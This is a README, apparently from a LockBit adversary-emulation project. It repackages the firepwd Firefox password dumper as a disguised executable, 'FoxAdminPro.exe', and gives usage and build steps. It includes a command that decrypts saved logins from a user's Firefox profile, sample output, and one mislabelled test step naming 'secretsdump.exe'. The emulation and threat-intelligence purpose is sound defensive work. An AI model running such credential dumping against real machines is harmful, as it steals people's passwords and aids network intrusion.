# Firefox Password Dumper

The original Firefox Password Dumper can be found at: <https://github.com/lclevy/firepwd>

- Adopted at [commit 167eabf3b88d5a7ba8b8bc427283f827b6885982](https://github.com/lclevy/firepwd/tree/167eabf3b88d5a7ba8b8bc427283f827b6885982)
- The original license can be found [here](https://github.com/lclevy/firepwd/blob/master/LICENSE)
- The original README can be found [here](https://github.com/lclevy/firepwd/blob/master/readme.md)

Modifications:

- Usage and build instructions adapted to build via PyInstaller

## Usage

Command line arguments and usage of the compiled FoxAdminPro.exe is the same as its Python counterpart.

```cmd
FoxAdminPro.exe -h
```

```cmd
Usage: FoxAdminPro.exe [options]

Options:
  -h, --help            show this help message and exit
  -v VERBOSE, --verbose=VERBOSE
                        verbose level
  -p MASTERPASSWORD, --password=MASTERPASSWORD
                        masterPassword
  -d DIRECTORY, --dir=DIRECTORY
                        directory
```

In the LockBit scenario, FoxAdminPro.exe is ingressed and executed by the operator using chocolatey. The following is an example of the executed command line arguments to dump passwords from the FireFox browser in order to recover the domain admin's password:

```cmd
FoxAdminPro.exe -d C:\\Users\\[user]\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\[profile_name]\
```

```cmd
globalSalt: b'012ede3c660dbe7c18cdffde85cfd6b9cfce2f08'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'4e15aeb9df4186f90145e57b19e8d0f661c7d11b122b24f5d905c5287b13b53f'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'3ab891069ca2dcb8df719c2c9750'
       }
     }
   }
   OCTETSTRING b'1074f74e6878d0b786afc6d764511610'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'253296683b6fa36636801def51db1ceb4972fdcbd098dec0a6ea952f1a2e0ab5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'5be806558847f66bbe9901aa45ea'
       }
     }
   }
   OCTETSTRING b'b10a6284ceba83bfde1ef3ec9739c4847ac0a124bc6435bcbc415ea36deefd4c'
 }
clearText b'620ef226a89dc4baeacde6e0fea161cd9b3819c87c3252d90808080808080808'
decrypting login/password pairs
http://www.fakewebsite.com:b'test',b'passw0rd!'
```

The dumped passwords will be printed at the end of the output under the line `decrypting login/password pairs`.

## Build Instructions

### Build Environment Setup

The following steps will walk through the setup of the build environment.

1. Open a Command Prompt with administrative privileges to install python (minimum Python 3.12)

    ```cmd
    choco install python
    ```

1. From LockBit/Resources/firepwd, create a Python virtual environment

    ```cmd
    python -m venv firepwd-venv
    ```

1. Activate the virtual environment

    ```cmd
    firepwd-venv\Scripts\activate.bat
    ```

1. Install pip (minimum Pip 23.2.1) then use pip to install pyinstaller and the firepwd dependencies

    ```cmd
    python -m pip install -U pip
    pip install pyinstaller
    pip install -r requirements.txt
    ```

### PyInstaller Build Command

1. Build FoxAdminPro.exe using pyinstaller. This will create a `build` and a `dist` directory in the current working directory.

    ```cmd
    pyinstaller firepwd.py --onefile --path firepwd --name FoxAdminPro
    ```

1. Test execution of secretsdump.exe

    ```cmd
    cd dist
    FoxAdminPro.exe -h
    ```

## CTI Reporting

[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)
[Antiy Labs](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)
